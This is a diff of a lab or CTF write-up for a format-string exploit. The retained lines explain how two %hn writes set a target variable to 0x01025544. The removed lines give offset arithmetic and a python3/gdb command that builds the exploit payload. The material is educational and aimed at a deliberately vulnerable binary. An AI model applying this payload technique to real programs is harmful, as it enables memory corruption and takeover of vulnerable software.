@@ -37,22 +37,4 @@ python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<II",0x08049
 
 ## Why it works
 Two addresses are placed at the start: `0x080496f4` and `0x080496f6`. `%21820x` brings the printed count to `0x5544`; `%12$hn` writes that to the low half. `%43966x` brings the count to `0x0102` modulo 65536; `%13$hn` writes the high half. Together, `target` becomes `0x01025544`.
-
-## Extra notes
-- `fgets(buffer, 0x200, stdin)` allows long format strings up to 511 bytes.
-- Leak the input position with `AAAA%x...`; `41414141` appears at argument 12.
-- Two addresses are needed because the desired value `0x01025544` is too large for one comfortable `%n` write.
-- Using `%hn` writes only two bytes at a time and reduces output size.
-- Low half target: `0x5544` = 21828; the first 8 bytes are addresses, so print 21820 more.
-- High half target: `0x0102` = 258 modulo 65536; after the first write the count is already 21828, so 43966 more bytes are needed.
-- The final address bytes are little-endian: `f4 96 04 08` and `f6 96 04 08`.
-- Debug:
-```bash
-printf 'AAAA%%12$x\n' | ./bin
-gdb -q ./bin <<'GDB_EOF'
-b *0x08048498
-run < <(python3 -c 'import sys,struct; sys.stdout.buffer.write(struct.pack("<II",0x080496f4,0x080496f6)+b"%21820x%12$hn%43966x%13$hn"+b"\n")')
-p/x *(int*)0x080496f4
-GDB_EOF
-```
-- Expected success message: `you have modified the target :)`.
+![alt text](<Screenshot From 2026-10-13 11-33-17.png>)
